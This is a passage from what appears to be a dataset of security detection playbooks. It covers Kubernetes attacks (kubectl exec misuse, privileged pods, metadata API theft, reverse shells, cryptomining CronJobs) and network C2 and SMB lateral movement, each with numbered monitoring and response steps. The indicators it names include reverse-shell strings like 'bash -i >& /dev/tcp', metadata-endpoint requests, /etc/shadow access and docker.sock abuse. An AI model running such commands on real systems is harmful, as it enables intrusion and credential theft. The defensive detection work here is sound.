- **Attack Type**: kubectl Misuse
- **Target**: Kubernetes Cluster
- **Vulnerability**: Insecure kubeconfig use
- **MITRE**: T1059.004
- **Impact**: Container compromise
- **Tools**: Kubernetes Audit Logs, Falco, CloudTrail
- **Scenario**: Attacker uses stolen kubeconfig to run kubectl exec into live container
- **Attack Steps**: 1. Monitor audit logs for "verb": "create", "objectRef": {"resource": "pods", "subresource": "exec"} events. 2. Check if the username or source IP initiating kubectl exec is unfamiliar or not tied to a known user identity. 3. Correlate with context — e.g., was there a prior failed login or unusual kubeconfig usage? 4. Capture command arguments passed into the container shell (sh, bash, etc.) and flag dangerous operations like wget, curl, or base64. 5. Alert SOC if the exec occurred in a production namespace or targeted privileged containers. 6. Cross-reference container logs to inspect what commands were executed post-login. 7. If suspicious, isolate the pod, block the user's access, and revoke the associated credentials. 8. Document incident and update audit rules to flag such exec attempts in the future.
- **Detection**: Audit + Source IP check
- **Solution**: Revoke + Block + Alert
- **Tags**: #kubectl #exec #podaccess

## Monitor Suspicious API Server Probing via kubectl get/list Floods

- **Attack Type**: Reconnaissance
- **Target**: Kubernetes API Server
- **Vulnerability**: Reconnaissance via list API
- **MITRE**: T1087.002
- **Impact**: Resource mapping
- **Tools**: Kubernetes API Logs, Fluentd, Prometheus
- **Scenario**: Attacker probes large numbers of resources using automated kubectl get commands
- **Attack Steps**: 1. Detect high-frequency calls to list or get operations on multiple resources (pods, deployments, secrets, services) within short time window. 2. Cross-reference the client IP and user agent — flag kubectl usage from unknown or service accounts. 3. Correlate the event with login attempts or newly added kubeconfigs. 4. Look for usage of wildcard selectors (kubectl get all --all-namespaces) which indicate enumeration. 5. Alert if access comes from a service account not scoped to that namespace. 6. Trigger behavior analysis if multiple get requests are followed by resource creation or modifications. 7. Rate-limit or block excessive API usage via admission controller or service mesh policies. 8. Document user behavior and notify DevSecOps team for follow-up.
- **Detection**: API volume + agent correlation
- **Solution**: Alert + Rate-limit
- **Tags**: #apiserver #kubectlget #recon

## Detection of Abnormal Pod Creation with Privileged Flag Enabled

- **Attack Type**: Container Privilege Escalation
- **Target**: K8s Workload
- **Vulnerability**: Misuse of security context
- **MITRE**: T1068
- **Impact**: Container to host access
- **Tools**: Kubernetes Audit Logs, OPA Gatekeeper, Kyverno
- **Scenario**: Attacker deploys pod with elevated privileges via runAsRoot, privileged: true
- **Attack Steps**: 1. Intercept pod creation events and inspect securityContext fields. 2. Flag pods where privileged: true, capabilities: add: [ALL], or runAsUser: 0 is explicitly set. 3. Cross-reference if the user is authorized to create such workloads. 4. Alert when such configurations appear in non-development namespaces. 5. Monitor logs from container runtime for access to host binaries or sensitive mounts (/etc, /proc). 6. Automatically quarantine the pod using network policy if suspicious. 7. Notify security team and rollback deployment using last known good manifest. 8. Enforce Pod Security Admission controls to deny such specs in production.
- **Detection**: Admission + Context
- **Solution**: Quarantine + Block
- **Tags**: #podsecurity #privilegedcontainers

## Monitor Suspicious ConfigMap or Secret Mount in Pod

- **Attack Type**: Secret Leakage Risk
- **Target**: Kubernetes Pods
- **Vulnerability**: Unauthorized secret access
- **MITRE**: T1552.004
- **Impact**: Secret exposure
- **Tools**: Kubernetes Audit Logs, Falco, Gatekeeper
- **Scenario**: Attacker mounts secrets from other namespaces into pods for data exfiltration
- **Attack Steps**: 1. Detect pod specifications referencing volumeMounts linked to secrets or configMaps. 2. Check if these secrets belong to other namespaces or contain sensitive keywords (e.g., db-pass, token, ssh). 3. Correlate event with the role and permissions of the user/service account. 4. Alert if secrets are accessed by non-production accounts or unknown workloads. 5. Log all access to mounted secrets by monitoring /etc/secrets/ or the mount path. 6. Trigger alert if base64-decoding tools like openssl, base64, or cat are used immediately after mount. 7. Auto-remove the pod if policy violation is detected and log the full spec. 8. Restrict secret volume mounts via RBAC and enforce encryption at rest.
- **Detection**: Volume + Access match
- **Solution**: Eject + Alert
- **Tags**: #secrets #configmap #podmount

## Detection of Hidden initContainer Running Malicious Code

- **Attack Type**: Init Container Abuse
- **Target**: K8s Pod Lifecycle
- **Vulnerability**: Abuse of initContainers
- **MITRE**: T1204.002
- **Impact**: Pre-execution compromise
- **Tools**: Kubernetes Logs, KubeAudit, Container Runtime Logs
- **Scenario**: Threat actor uses initContainer to run malware before app pod starts
- **Attack Steps**: 1. Monitor all pod specs for presence of initContainers that pull from non-standard image repositories. 2. Analyze the commands inside the initContainer — flag any calls to remote servers or unusual tools. 3. Check if the init container image is from a registry not used within org (e.g., pastebin, duckdns). 4. Alert when initContainers run scripts or download binaries (e.g., wget, curl, chmod +x). 5. If suspicious activity is found, terminate pod before main container launches. 6. Capture container filesystem snapshot for forensic analysis. 7. Block usage of unverified initContainers via policy engines like Kyverno. 8. Notify DevOps and initiate incident triage.
- **Detection**: Container logs + policy scan
- **Solution**: Kill + Snapshot
- **Tags**: #initcontainer #maliciousinit #runtime

## Alert on Lateral Movement via Compromised Service Account

- **Attack Type**: Privilege Escalation
- **Target**: Kubernetes Cluster
- **Vulnerability**: Token misuse
- **MITRE**: T1528
- **Impact**: Namespace traversal
- **Tools**: K8s API Logs, RBAC Audit, Token Review API
- **Scenario**: Attacker uses exposed service account token to access other namespaces
- **Attack Steps**: 1. Detect API calls made using service account tokens instead of user credentials. 2. Flag tokens used in namespaces outside their intended deployment. 3. Monitor for signs of resource creation or secrets access across unrelated namespaces. 4. Use token review API to validate caller identity and scope. 5. Alert if token lifetime is unusually long or not tied to workload identity. 6. Invalidate the token and rotate secrets tied to it. 7. Audit RBAC permissions and scope down where necessary. 8. Enable automountServiceAccountToken: false unless explicitly required.
- **Detection**: API + namespace audit
- **Solution**: Rotate + Revoke
- **Tags**: #serviceaccount #tokenabuse #rbac

## Detect Use of Suspicious kubectl Commands via Audit Log Regex

- **Attack Type**: kubectl Command Audit
- **Target**: Kubernetes CLI
- **Vulnerability**: Stealthy data movement
- **MITRE**: T1020
- **Impact**: Data theft via CLI
- **Tools**: K8s Audit Logs, Regex Log Parser, SIEM
- **Scenario**: Malicious user runs kubectl cp or kubectl port-forward for stealth exfiltration
- **Attack Steps**: 1. Enable auditing of kubectl commands and capture shell history or client logs. 2. Look for commands like kubectl cp which could be used to copy data out of containers. 3. Alert on kubectl port-forward which can expose internal services to external attacker. 4. Monitor if these commands are run from jump hosts or unusual IPs. 5. Correlate with any pod events tied to the same session. 6. Disable or restrict usage of these commands in production environments. 7. Notify DevSecOps and log user identity tied to audit log. 8. Retain historical logs for behavioral comparison over time.
- **Detection**: Regex match + user context
- **Solution**: Alert + Disable
- **Tags**: #kubectlcp #portforward #logmonitoring

## Monitor for Pod Deletion Immediately After Suspicious Activity

- **Attack Type**: Covering Tracks
- **Target**: Kubernetes Cluster
- **Vulnerability**: Evidence destruction
- **MITRE**: T1070
- **Impact**: Log evasion
- **Tools**: K8s Audit Logs, EKS/GKE Alerts, Prometheus
- **Scenario**: Attacker deletes pod post-compromise to erase evidence
- **Attack Steps**: 1. Detect pod deletion events (DELETE on pod resources) within 5 minutes of suspicious activity (e.g., exec, curl, wget). 2. Correlate with audit log sequence for prior access into the pod. 3. Alert if deletion was initiated by unauthorized user or unknown service account. 4. Cross-check logs from container runtime to retrieve any lingering stdout/stderr. 5. Inspect storage volumes or PVs associated with the pod for forensic recovery. 6. Notify SOC and disable the account used for deletion. 7. Retain pod metadata and attach it to incident case. 8. Implement delay-delete policy or finalizer hook to prevent instant deletion.
- **Detection**: Time + action correlation
- **Solution**: Alert + Preserve
- **Tags**: #poddeletion #logwipe #forensics

## Detection of Unusual Traffic from Container to Metadata API

- **Attack Type**: Cloud Metadata Theft
- **Target**: Cloud Containers
- **Vulnerability**: Metadata abuse
- **MITRE**: T1552.005
- **Impact**: Cloud credential theft
- **Tools**: Network Logs, eBPF Monitors, Falco
- **Scenario**: Pod sends outbound traffic to GCP/AWS/Azure metadata endpoints
- **Attack Steps**: 1. Monitor egress traffic from containers to IPs like 169.254.169.254. 2. Alert when pods attempt to curl or fetch /latest/meta-data/ endpoints. 3. Check container image — if third-party or from unknown repo, increase severity. 4. Identify whether pod has elevated capabilities (e.g., net_admin, host network). 5. Review IAM permissions tied to workload identity. 6. Block outbound metadata requests at network layer using policy rules. 7. Log full request headers and payloads for investigation. 8. Rotate credentials if access was successful.
- **Detection**: Egress + metadata target
- **Solution**: Block + Investigate
- **Tags**: #metadataapi #cloudabuse #gke

## Alert on Pod Scheduled to Node with Tainted Role

- **Attack Type**: Scheduling Bypass
- **Target**: Kubernetes Node
- **Vulnerability**: Taint bypass
- **MITRE**: T1609
- **Impact**: Sensitive node exposure
- **Tools**: K8s Scheduler Logs, Node Metadata, Admission Controller
- **Scenario**: Attacker evades taints and tolerations to schedule pod on sensitive node
- **Attack Steps**: 1. Monitor pod scheduling events where tolerations override taints (e.g., NoSchedule). 2. Flag pods assigned to nodes with sensitive roles (control-plane, bastion, infra). 3. Validate whether such scheduling was intentional by DevOps or bypassed policies. 4. Correlate with nodeSelector, affinity, or manually altered pod spec. 5. Block pod if violation of taint policy is detected. 6. Notify platform security and investigate user who submitted spec. 7. Implement validating webhook to prevent taint override. 8. Harden critical node groups using restrictive access controls.
- **Detection**: Schedule + node role audit
- **Solution**: Block + Webhook
- **Tags**: #taints #scheduler #nodeaccess

## Detect Use of kubelet API for Unauthorized Command Execution

- **Attack Type**: kubelet API Abuse
- **Target**: Kubernetes Node
- **Vulnerability**: Unprotected kubelet
- **MITRE**: T1071.001
- **Impact**: Node takeover
- **Tools**: kubelet Logs, KubeHunter, Sysdig Secure
- **Scenario**: Adversary targets exposed kubelet ports to run arbitrary commands on nodes
- **Attack Steps**: 1. Continuously scan node ports for unauthenticated access to kubelet (10250). 2. Monitor HTTP requests made to kubelet API endpoints such as /run, /exec, or /containerLogs. 3. Alert when a non-cluster IP accesses kubelet endpoints. 4. Examine headers and payloads for command execution attempts like POST /exec with command strings (sh, bash, curl, etc.). 5. Cross-reference kubelet logs with node-level logs to detect shell spawn or binary execution. 6. Inspect whether TLS client certs were used or if anonymous access occurred. 7. Immediately isolate affected node, revoke access tokens, and rotate node credentials. 8. Enforce RBAC to restrict kubelet access and enable TLS authentication.
- **Detection**: API pattern + log trace
- **Solution**: Revoke + Patch
- **Tags**: #kubeletabuse #nodecompromise

## Monitor for Reverse Shell Attempts via kubectl exec

- **Attack Type**: Reverse Shell
- **Target**: Kubernetes Workload
- **Vulnerability**: Remote access via shell
- **MITRE**: T1059.003
- **Impact**: Command-and-control
- **Tools**: K8s Audit Logs, Container Logs, Network Flow Logs
- **Scenario**: Threat actor uses kubectl exec to spawn reverse shell back to external server
- **Attack Steps**: 1. Parse audit logs for kubectl exec events invoking /bin/sh, bash, or zsh. 2. Track subsequent container logs for commands like nc, bash -i >& /dev/tcp, socat, or encoded payloads. 3. Monitor egress network flows to uncommon external IPs or non-whitelisted ports (e.g., 4444, 9001). 4. Correlate IPs with threat intel sources to detect known C2 infrastructure. 5. Alert and terminate pod connection, quarantining associated containers. 6. Take a runtime snapshot of the container file system and process list. 7. Block outbound access to unknown IPs by default using egress policies. 8. Audit user who executed the command and restrict their access.
- **Detection**: Command + Netflow
- **Solution**: Kill + Forensic
- **Tags**: #reverseshell #kubectlexec #egressfilter

## Alert on Pod Running in Host PID or Host Network Mode

- **Attack Type**: Namespace Escalation
- **Target**: Kubernetes Cluster
- **Vulnerability**: Privilege escalation
- **MITRE**: T1068
- **Impact**: Visibility over host
- **Tools**: Pod Spec Logs, Admission Controller, Auditd
- **Scenario**: Pod gains access to host’s PID or network namespace, enabling visibility of all processes
- **Attack Steps**: 1. Inspect pod specifications for hostPID: true or hostNetwork: true. 2. Cross-reference with service account’s expected scope — alert if low-priv account creates high-priv pod. 3. Check if pod container runs as root or tries accessing host binaries. 4. Monitor container runtime for processes like ps, netstat, iptables that indicate host enumeration. 5. Kill the pod if unapproved and save snapshot of filesystem. 6. Send alert to security team with pod YAML and event trace. 7. Implement policies to block host namespace access unless explicitly whitelisted. 8. Harden cluster nodes using AppArmor/SELinux to limit what pods can see.
- **Detection**: Runtime + Spec
- **Solution**: Enforce + Alert
- **Tags**: #hostpid #hostnetwork #escalation

## Detect Container Escape Attempt via Mounting Sensitive Host Paths

- **Attack Type**: Container Escape
- **Target**: K8s Workload
- **Vulnerability**: Host path exposure
- **MITRE**: T1611
- **Impact**: Root file access
- **Tools**: Pod YAML Audit, Falco, OPA Gatekeeper
- **Scenario**: Adversary tries to mount paths like /proc, /root, or /etc from host
- **Attack Steps**: 1. Review pod specs for volumes mapping to host directories, particularly /proc, /root, /etc, /var/run/docker.sock. 2. Trigger alert when these mounts are not part of known deployments or come from unknown registries. 3. Detect if mounted directories are used for credential access (/etc/shadow, /root/.ssh/). 4. Check for processes within container accessing these paths using open() or read() syscalls. 5. Auto-block deployment using policy enforcer or delete pod instantly. 6. Notify DevSecOps with full audit trail. 7. Restrict containers from mounting arbitrary host paths unless explicitly reviewed. 8. Enable AppArmor/Docker seccomp profiles for syscall filtering.
- **Detection**: Mount + syscall trace
- **Solution**: Block + Alert
- **Tags**: #containerevasion #mountabuse #k8ssecurity

## Alert on DNS Tunneling Attempts from Pod for C2

- **Attack Type**: Covert Channel
- **Target**: Kubernetes DNS
- **Vulnerability**: DNS misuse
- **MITRE**: T1071.004
- **Impact**: Covert exfiltration
- **Tools**: CoreDNS Logs, DNS Analytics, SIEM
- **Scenario**: Compromised pod sends encoded data via frequent, large DNS queries
- **Attack Steps**: 1. Monitor CoreDNS logs for high-frequency outbound queries with long subdomains. 2. Extract domain entropy and flag queries with suspicious encoding patterns (e.g., base64 in subdomain). 3. Match DNS requests to known DGA (domain generation algorithm) or tunneling tools like iodine, dnscat2. 4. Alert when query frequency per pod exceeds normal thresholds. 5. Capture packet payloads to confirm non-standard use of DNS. 6. Quarantine the pod and block its DNS resolution temporarily. 7. Enforce egress DNS policies to approved resolvers only. 8. Notify incident response and collect PCAP logs.
- **Detection**: DNS entropy + frequency
- **Solution**: Block + PCAP
- **Tags**: #dnstunnel #coreDNS #c2traffic

## Detection of Resource Hijacking via Malicious CronJob

- **Attack Type**: Persistence + Crypto Mining
- **Target**: Kubernetes Job
- **Vulnerability**: Unauthorized recurring task
- **MITRE**: T1053.005
- **Impact**: Persistent resource abuse
- **Tools**: K8s API Server Logs, Audit Logs, Sysdig
- **Scenario**: Attacker creates CronJob to execute miner every X minutes
- **Attack Steps**: 1. Monitor for creation of CronJob objects in suspicious namespaces or via untrusted identities. 2. Inspect the job spec for execution of mining software (xmrig, minerd, etc.). 3. Flag if job image is pulled from unknown external Docker registry. 4. Correlate job execution times with CPU/memory spikes on nodes. 5. Review logs of the container spawned to identify outbound mining pool connections. 6. Kill active job pods and delete CronJob resource. 7. Revoke access for compromised identity and notify DevOps. 8. Implement policy to limit creation of CronJobs outside specific teams.
- **Detection**: Job + CPU + Image
- **Solution**: Kill + Limit
- **Tags**: #cronjobabuse #mining #resourcehijack

## Detect High Pod CrashLoopBackOff Events with Suspicious Restart Reasons

- **Attack Type**: Pod Tampering
- **Target**: Kubernetes Deployment
- **Vulnerability**: Log evasion via crash
- **MITRE**: T1499.004
- **Impact**: Hidden malicious behavior
- **Tools**: Kubernetes Events, Container Logs, Prometheus
- **Scenario**: Attacker corrupts container to repeatedly crash, hiding traces of payload execution
- **Attack Steps**: 1. Alert on multiple pod restarts within short duration (CrashLoopBackOff status). 2. Investigate container logs for execution of unknown binaries before crash. 3. Check for patterns like sudden file deletion, socket errors, or segmentation faults. 4. Compare container image digest to baseline to confirm image tampering. 5. Inspect volumes and shared mounts for traces of attacker-written payloads. 6. Tag namespace and workload as compromised and disable auto-restart temporarily. 7. Retain pod logs and container filesystem for forensic analysis. 8. Enforce admission policy to allow only signed images and rollback deployment.
- **Detection**: Restart loop + log diff
- **Solution**: Quarantine + Rollback
- **Tags**: #crashloop #podtamper #forensics

## Alert on Sudden Privilege Escalation via RBAC Binding

- **Attack Type**: Privilege Escalation
- **Target**: Kubernetes API
- **Vulnerability**: RBAC abuse
- **MITRE**: T1078.004
- **Impact**: Admin privilege gain
- **Tools**: K8s Audit Logs, RBAC Audit Tools, Rego Policies
- **Scenario**: Compromised user/service account grants themselves cluster-admin
- **Attack Steps**: 1. Log and audit creation of ClusterRoleBinding and RoleBinding resources. 2. Alert when bindings include cluster-admin, edit, or admin roles unexpectedly. 3. Correlate timestamp with login or token usage events from the same user. 4. Detect if new bindings reference service accounts outside of their own namespace. 5. Immediately revoke binding and disable associated token. 6. Notify platform admin and review all role assignments. 7. Enforce RBAC policy linting during deployment CI/CD process. 8. Maintain least privilege RBAC maps per namespace.
- **Detection**: Role diff + token match
- **Solution**: Revoke + Notify
- **Tags**: #rbacbinding #escalation #clusteradmin

## Detect API Server Access Using Legacy Static Credentials

- **Attack Type**: Insecure Authentication
- **Target**: Kubernetes API
- **Vulnerability**: Token reuse
- **MITRE**: T1550.001
- **Impact**: Unauthorized resource access
- **Tools**: API Server Logs, K8s Auth Logs, Token Review API
- **Scenario**: Attacker authenticates using static token still configured in cluster
- **Attack Steps**: 1. Monitor for API requests using static tokens or credentials from deprecated config. 2. Check for absence of OIDC or client certificate usage in request headers. 3. Alert when long-lived token is used from unfamiliar IP or outside working hours. 4. Review audit trail for resources accessed by legacy token. 5. Rotate or revoke any known static tokens across nodes and CI/CD pipelines. 6. Enforce short-lived service tokens and implement token expiration. 7. Enable audit policy to track unauthenticated or legacy access attempts. 8. Notify DevSecOps to remove old bootstrap tokens and secrets.
- **Detection**: Auth headers + time pattern
- **Solution**: Rotate + Audit
- **Tags**: #tokenreuse #authmisconfig #k8slegacy

## Monitor for kubectl Proxy Misuse to Bypass Network Policy

- **Attack Type**: Internal Service Exposure
- **Target**: K8s CLI Proxy
- **Vulnerability**: Network bypass
- **MITRE**: T1090.002
- **Impact**: Internal data leak
- **Tools**: K8s CLI Logs, Audit Logs, Network Traffic
- **Scenario**: User uses kubectl proxy to expose API access to external systems
- **Attack Steps**: 1. Log all kubectl proxy commands via shell activity or kube audit trail. 2. Detect port binding on 127.0.0.1 or 0.0.0.0 and web requests sent via proxy tunnel. 3. Alert when proxy traffic originates from internal to external system (data pivot). 4. Match proxy request path to sensitive API endpoints (/api/v1/secrets, /metrics). 5. Capture full HTTP session and identify potential misuse. 6. Terminate pod or user session and rotate affected credentials. 7. Restrict proxy capability via policy or disable it altogether in production. 8. Educate developers on safe kubectl usage practices.
- **Detection**: Proxy + path + session
- **Solution**: Disable + Educate
- **Tags**: #kubectlproxy #networkbypass #internalleak

## Detect Use of Anonymous Access to Kubernetes Dashboard

- **Attack Type**: Unauthenticated Access
- **Target**: Kubernetes Dashboard
- **Vulnerability**: Exposed UI
- **MITRE**: T1189
- **Impact**: UI-based control plane access
- **Tools**: Dashboard Logs, Network Flow, kube-hunter
- **Scenario**: Attacker connects to exposed K8s dashboard without credentials
- **Attack Steps**: 1. Scan logs for HTTP requests to the Kubernetes dashboard endpoint (/api/v1/namespaces/kubernetes-dashboard/services/). 2. Alert when requests are unauthenticated or contain missing/invalid auth headers. 3. Check access method—was it via IP directly (e.g., http://nodeIP:30000) or port-forwarded using kubectl? 4. Identify user-agent headers from tools like browsers, curl, or automation tools (suspicious if not cluster users). 5. Track actions performed—if the unauthenticated user listed secrets, created resources, or accessed workloads. 6. Kill session if malicious activity is found and disable the service if publicly exposed. 7. Notify platform admins and implement dashboard authentication using OIDC or kubeconfig-based login. 8. Restrict dashboard exposure using ingress with IP allow-lists and 2FA.
- **Detection**: Header + action trace
- **Solution**: Disable + Alert
- **Tags**: #dashboard #unauthorizedaccess

## Alert on Use of Alpine Images for Suspicious Recon Pods

- **Attack Type**: Container Misuse
- **Target**: Kubernetes Workload
- **Vulnerability**: Lightweight shell abuse
- **MITRE**: T1595.002
- **Impact**: Manual in-cluster recon
- **Tools**: Pod Specs, Image Logs, OPA, Kyverno
- **Scenario**: Attacker deploys minimal Alpine image for manual recon within cluster
- **Attack Steps**: 1. Parse pod creation logs for usage of base images like alpine, busybox, or unknown custom images. 2. Alert when container runs interactive shells (sh, ash) or uses networking tools like nslookup, ping, curl, wget. 3. Inspect for attempts to list Kubernetes internal services (kubernetes.default, etcd, metadata). 4. Identify namespace of execution—trigger higher alert severity if in production or sensitive workloads. 5. Enforce image allow-lists and flag deployments with unknown registries or digests. 6. Kill pod and preserve container filesystem as evidence. 7. Investigate who launched the pod and correlate with user logs. 8. Notify security team and restrict image pull access to approved registries only.
- **Detection**: Base image + tools
- **Solution**: Kill + Forensics
- **Tags**: #alpine #minimalpod #reconnaissance

## Detect Sudden Increase in Container File Writes Indicative of Web Shell

- **Attack Type**: Runtime Anomaly
- **Target**: Container Filesystem
- **Vulnerability**: File tampering
- **MITRE**: T1505.003
- **Impact**: Shell persistence
- **Tools**: eBPF, Falco, File Integrity Monitoring
- **Scenario**: Pod is compromised and adversary uploads a web shell to writable volume
- **Attack Steps**: 1. Monitor file creation and write activity within container directories (/var/www, /usr/share/nginx/html). 2. Alert if unfamiliar file extensions like .php, .jsp, .aspx appear in these paths. 3. Track container stdout logs for commands like echo, printf, base64 -d >. 4. Use file integrity tools or eBPF to detect write spikes beyond baseline in application directories. 5. Quarantine pod if tampering detected and preserve modified files. 6. Correlate access logs to identify remote IP interacting with uploaded web shell. 7. Patch vulnerable web apps or misconfigured services that allowed shell upload. 8. Enforce read-only filesystem on containers where possible.
- **Detection**: Write rate + ext audit
- **Solution**: Quarantine + Patch
- **Tags**: #webshell #containerwrite #fimap

## Alert on Frequent Use of kubectl Logs for Passive Recon

- **Attack Type**: Passive Recon
- **Target**: Kubernetes Logs
- **Vulnerability**: Recon through verbosity
- **MITRE**: T1213
- **Impact**: Passive information leak
- **Tools**: Kubernetes API Logs, CLI Logs
- **Scenario**: Adversary continuously fetches logs from multiple pods to map app behavior
- **Attack Steps**: 1. Track API requests to GET /api/v1/namespaces/*/pods/*/log. 2. Flag excessive usage (e.g., 100+ log fetches within 15 minutes). 3. Correlate with user identity—alert on unknown users or automation scripts. 4. Highlight logs being fetched from critical workloads (e.g., payment, auth pods). 5. Determine intent—log scraping could expose secrets, tokens, or sensitive app output. 6. Alert SOC if logs show errors, crash traces, or stack dumps being harvested. 7. Rate-limit log fetches per user/IP in production clusters. 8. Restrict access to logs using RBAC and audit retrieval events.
- **Detection**: Access frequency + target
- **Solution**: Limit + Alert
- **Tags**: #kubectllogs #passiverecon #logharvest

## Detect Use of exec to Inject Debug Tools into Containers

- **Attack Type**: On-the-Fly Tool Injection
- **Target**: Kubernetes Container
- **Vulnerability**: Tool misuse
- **MITRE**: T1036
- **Impact**: Container visibility abuse
- **Tools**: K8s Audit Logs, Container Logs, File Events
- **Scenario**: Attacker execs into container to upload tools like strace, tcpdump, nmap
- **Attack Steps**: 1. Monitor exec events that are immediately followed by file creation or binary upload (e.g., wget, curl, scp). 2. Alert when common diagnostic tools (nmap, tcpdump, strace) are downloaded or run from container shell. 3. Correlate with lack of these tools in the original image—indicates post-deployment tampering. 4. Check file hashes and sources of downloaded binaries. 5. Snapshot running processes and filesystem. 6. Terminate pod and trace who initiated exec session. 7. Enforce readOnlyRootFilesystem and prohibit exec on sensitive workloads. 8. Document and include hashes of injected tools in threat feeds.
- **Detection**: Post-exec actions
- **Solution**: Kill + Block
- **Tags**: #execabuse #toolinjection

## Alert on Inter-Pod Socket Communication with Unusual Ports

- **Attack Type**: Lateral Movement
- **Target**: Kubernetes Network
- **Vulnerability**: Internal lateral abuse
- **MITRE**: T1021.002
- **Impact**: Unauthorized inter-pod traffic
- **Tools**: Network Flow Logs, Cilium Hubble, Service Mesh
- **Scenario**: Pod communicates with other internal pods over high/unknown ports
- **Attack Steps**: 1. Log all internal pod-to-pod communications and analyze destination ports. 2. Alert when traffic targets uncommon ports (e.g., 6666, 7777, 31337). 3. Inspect pod labels, ownership, and IP-to-namespace mappings. 4. Use service mesh telemetry to check if connection occurred outside of approved services. 5. Terminate or quarantine pod initiating rogue communication. 6. Block ports via network policy and log attempted re-tries. 7. Alert security and retain packet captures for inspection. 8. Enforce egress controls between namespaces.
- **Detection**: Port + IP + flow
- **Solution**: Quarantine + Audit
- **Tags**: #podnetwork #unusualport #hubble

## Detect Container Accessing Socket to Docker/Containerd Daemon

- **Attack Type**: Runtime Privilege Escalation
- **Target**: Container Host
- **Vulnerability**: Docker socket exposure
- **MITRE**: T1611
- **Impact**: Full host access
- **Tools**: File Monitor, AuditD, eBPF Tools
- **Scenario**: Adversary accesses /var/run/docker.sock from container to control host
- **Attack Steps**: 1. Detect container mounts or direct access attempts to /var/run/docker.sock. 2. Monitor if API calls to Docker socket are made from within containerized apps. 3. Alert on creation of new containers or privilege manipulation via this socket. 4. Examine container image and entrypoint for embedded automation scripts. 5. Kill pod if unauthorized access is confirmed. 6. Notify SOC and trace any host changes made through socket. 7. Enforce strict AppArmor/SELinux profiles to prevent such access. 8. Use read-only mounts for host paths wherever possible.
- **Detection**: Socket access + API misuse
- **Solution**: Kill + Harden
- **Tags**: #dockersock #privilegeescalation

## Alert on Abnormal Pod Scheduling Across Isolated Namespaces

- **Attack Type**: Scheduling Anomaly
- **Target**: K8s Scheduler
- **Vulnerability**: Namespace violation
- **MITRE**: T1078.003
- **Impact**: Zonal compromise
- **Tools**: Scheduler Logs, Admission Controller, Namespaces
- **Scenario**: Adversary uses automation to spin up pods across isolated zones
- **Attack Steps**: 1. Review scheduler logs for rapid pod creation across isolated or unrelated namespaces. 2. Alert when a user/service account schedules pods in zones they don’t own. 3. Cross-check if pods use suspicious images or bypass normal constraints. 4. Block deployment using webhook if abnormality detected. 5. Capture audit logs and investigate workload specs. 6. Notify platform security and roll back unauthorized workloads. 7. Harden namespace RBAC boundaries and implement quotas. 8. Restrict scheduling based on labels and network zones.
- **Detection**: Namespace + rate + RBAC
- **Solution**: Block + Alert
- **Tags**: #podscheduling #namespaceabuse

## Detection of Suspicious GPG or Encryption Tool Execution in Container

- **Attack Type**: Data Obfuscation
- **Target**: Kubernetes Workload
- **Vulnerability**: Obfuscation for exfil
- **MITRE**: T1022
- **Impact**: Data hiding before exfil
- **Tools**: Process Monitor, Runtime Sensor, Sysdig
- **Scenario**: Attacker encrypts exfil data before transmission using GPG
- **Attack Steps**: 1. Monitor container processes for gpg, openssl, or age binary execution. 2. Track output file location and destination IP. 3. Alert when encryption occurs followed by network exfil activity. 4. Kill pod and retain all encrypted blobs for IR. 5. Identify how binary entered the container (exec/upload or pre-baked). 6. Trace external endpoints and match against threat intel. 7. Notify incident team and disable container image used. 8. Block encryption tools in prod containers unless justified.
- **Detection**: Proc + Net + File
- **Solution**: Block + Retain
- **Tags**: #datablinding #gpgabuse #exfil

## Monitor for Unauthorized Use of kubectl Top to Extract Metrics

- **Attack Type**: Recon + Metrics Abuse
- **Target**: Kubernetes Cluster
- **Vulnerability**: Cluster intel gathering
- **MITRE**: T1087.003
- **Impact**: Cluster performance leak
- **Tools**: CLI Logs, Metrics Server, Audit Logs
- **Scenario**: Attacker uses kubectl top to extract cluster performance info
- **Attack Steps**: 1. Log usage of kubectl top nodes and kubectl top pods. 2. Alert if used by unknown users or service accounts. 3. Flag requests that occur in rapid succession or from unusual IPs. 4. Inspect metrics for signs of reconnaissance—memory, CPU usage patterns, resource limits. 5. Correlate with later actions (e.g., selective targeting based on weak pods). 6. Limit access to metrics APIs via RBAC. 7. Educate users to avoid exposing metrics in shared contexts. 8. Detect excessive scraping of metrics APIs using Prometheus or audit trails.
- **Detection**: Command trace + identity
- **Solution**: RBAC + Alert
- **Tags**: #kubectltop #metricsleak #clusterintel

## Identify C2 Beaconing via Regular TCP Beacons

- **Attack Type**: Command and Control (C2)
- **Target**: Endpoint Network Flow
- **Vulnerability**: Periodic traffic pattern
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Persistent C2 channel
- **Tools**: Wireshark, Zeek, Suricata
- **Scenario**: Adversary establishes persistent C2 channel by sending periodic small TCP packets to an external IP at regular intervals
- **Attack Steps**: 1. Load PCAP into Wireshark and filter for outbound TCP packets with small payload size (< 100 bytes). 2. Use Zeek scripts to extract flow metadata and plot inter-packet arrival times. 3. Identify flows with consistent periodicity (e.g., every 60 seconds) which is unusual for normal traffic. 4. Correlate IP addresses to threat intel feeds (e.g., AlienVault OTX) to check for known malicious hosts. 5. Inspect payload for signs of encryption or obfuscation, confirming suspicious C2 data. 6. Alert if the periodic TCP beaconing matches known malware patterns (e.g., APT C2 profiles). 7. Cross-reference with DNS logs to detect related domain queries from host. 8. Notify SOC to isolate affected host and block IP at firewall.
- **Detection**: Flow periodicity + payload analysis
- **Solution**: Block IP + host isolation
- **Tags**: #C2beacon #TCPflow #periodictraffic

## Detect Lateral Movement via SMB over NetBIOS

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: SMB authentication misuse
- **MITRE**: T1021.002 (SMB/Windows Admin Shares)
- **Impact**: Data theft, lateral spread
- **Tools**: Wireshark, Zeek, Suricata
- **Scenario**: Attacker moves laterally within network using SMB protocol to access shared drives on internal hosts
- **Attack Steps**: 1. Load network capture in Wireshark and filter for SMB traffic (tcp.port == 445 or 139). 2. Identify SMB sessions initiated from unusual source IPs within the LAN. 3. Examine the SMB packets for session setup requests, authentication attempts, and file open or write commands. 4. Use Zeek to flag connections with failed authentication followed by successful logins, indicative of credential reuse. 5. Monitor for unusually large file transfers which may indicate data staging. 6. Alert if SMB sessions access critical file shares or backup repositories. 7. Correlate with endpoint logs for suspicious user logins or processes accessing network shares. 8. Block SMB traffic from untrusted or unexpected hosts and alert incident response.
- **Detection**: SMB session monitoring + endpoint logs
- **Solution**: Restrict SMB + user authentication audit
- **Tags**: #SMBlateral #netbios #fileaccess

## Spot Data Exfiltration over DNS Tunneling

- **Attack Type**: Data Exfiltration
- **Target**: Network DNS
